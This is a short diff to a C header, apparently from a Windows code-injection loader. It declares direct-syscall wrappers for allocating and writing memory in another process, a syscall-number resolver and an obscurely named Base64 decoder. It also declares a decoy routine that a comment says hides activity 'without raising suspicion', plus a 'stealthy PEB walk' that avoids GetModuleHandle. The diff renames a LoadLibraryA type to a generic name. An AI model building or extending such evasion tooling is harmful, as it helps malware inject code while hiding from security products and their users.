@@ -6,7 +6,7 @@
 
 #define ARRAY_SIZE 1000
 
-typedef HMODULE(WINAPI* pLoadLibraryA)(LPCSTR);
+typedef HMODULE(WINAPI* pMod)(LPCSTR);
 
 DWORD GetSyid(LPCSTR functionName);
 
@@ -18,9 +18,6 @@ extern NTSTATUS CustAVM(HANDLE hProcess, PVOID *BaseAddress, ULONG ZeroBits, PSI
 
 extern NTSTATUS CustWVM(HANDLE hProcess, PVOID BaseAddress, PVOID Buffer, SIZE_T BufferSize, PSIZE_T NumberOfBytesWritten);
 
-// Function to Resolve APIs
-FARPROC ResolveFn(LPCSTR mod, LPCSTR fn);
-
 // Base64Decode
 char* Bsfd(const char* encoded);
 
@@ -30,8 +27,11 @@ It looks like legitimate processing activity without raising suspicion.
 */
 void SortNumbers();
 
-// Function to retrieve LoadLibraryA using a stealthy PEB walk
-pLoadLibraryA GetLoadLibraryA();
+/*
+Function to retrieve Function in Module using a stealthy PEB walk
+This doesn't rely on GetModuleHandle
+*/ 
+pMod GetMod(LPCSTR mod, LPCSTR fn);
 
 #ifdef _M_X64
 #define PEB_OFFSET 0x60
